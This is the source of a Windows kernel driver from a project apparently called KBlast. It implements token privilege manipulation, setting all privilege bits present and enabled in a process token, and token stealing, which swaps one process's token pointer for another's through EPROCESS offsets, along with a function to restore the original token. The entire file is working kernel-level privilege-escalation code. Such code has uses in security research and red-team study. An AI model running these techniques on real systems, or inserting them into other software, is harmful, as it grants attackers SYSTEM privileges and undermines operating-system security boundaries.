/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlaster.sys ( driver )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlaster_k_token.hpp"


PVOID tokenRestore = 0;

NTSTATUS KBlaster_k_TokenPrivilegeManipulate(int processID, PRIVILEGES_ACTION prOption)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PEPROCESS pEprocess = 0;
	PACCESS_TOKEN pAccessToken = 0;
	PPROCESS_PRIVILEGES pPriv = 0;

	if (KBlaster_k_utils_GetWindowsVersion() == WINDOWS_UNSUPPORTED)
	{
		status = STATUS_NOT_SUPPORTED;
		goto exit;
	}

	status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
	if (NT_SUCCESS(status))
	{
		pAccessToken = PsReferencePrimaryToken(pEprocess);
		pPriv = (PPROCESS_PRIVILEGES)((ULONG_PTR)pAccessToken + 0x40);
		switch (prOption)
		{
		case PRIVILEGES_ENABLEALL:
			pPriv->Present[0] = pPriv->Enabled[0] = 0xff;
			pPriv->Present[1] = pPriv->Enabled[1] = 0xff;
			pPriv->Present[2] = pPriv->Enabled[2] = 0xff;
			pPriv->Present[3] = pPriv->Enabled[3] = 0xff;
			pPriv->Present[4] = pPriv->Enabled[4] = 0xff;
			break;

		case PRIVILEGES_DISABLEALL:
			pPriv->Present[0] = pPriv->Enabled[0] = 0x00;
			pPriv->Present[1] = pPriv->Enabled[1] = 0x00;
			pPriv->Present[2] = pPriv->Enabled[2] = 0x00;
			pPriv->Present[3] = pPriv->Enabled[3] = 0x00;
			pPriv->Present[4] = pPriv->Enabled[4] = 0x00;
			break;

		default:
			break;
		}

		PsDereferencePrimaryToken(pAccessToken);
		ObDereferenceObject(pEprocess);
	}

exit:

	return status;

}



NTSTATUS KBlaster_k_TokenContextSteal(int processID, int targetProcessID)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PEPROCESS pEprocess = 0, pTargetEprocess = 0;
	PEX_FAST_REF pToken = 0, pTargetToken = 0;

	if (KBlaster_k_utils_GetWindowsVersion() == WINDOWS_UNSUPPORTED)
	{
		status = STATUS_NOT_SUPPORTED;
		goto exit;
	}

	status = PsLookupProcessByProcessId((HANDLE)targetProcessID, &pTargetEprocess);
	if (NT_SUCCESS(status))
	{
		status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
		if (NT_SUCCESS(status))
		{
			pToken = (PEX_FAST_REF)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
			pTargetToken = (PEX_FAST_REF)((ULONG_PTR)pTargetEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
			tokenRestore = pToken->Value;
			pToken->Value = pTargetToken->Value;

			ObDereferenceObject(pEprocess);
		}

		ObDereferenceObject(pTargetEprocess);
	}

exit:

	return status;

}


NTSTATUS KBlaster_k_TokenContextRestore(int processID)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PEPROCESS pEprocess = 0;
	PEX_FAST_REF pToken = 0;

	if (KBlaster_k_utils_GetWindowsVersion() == WINDOWS_UNSUPPORTED)
	{
		status = STATUS_NOT_SUPPORTED;
		goto exit;
	}

	status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
	if (NT_SUCCESS(status))
	{
		pToken = (PEX_FAST_REF)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
		if (tokenRestore != 0)
		{
			pToken->Value = tokenRestore;
			tokenRestore = 0;
		}

		ObDereferenceObject(pEprocess);

	}

exit:

	return status;

}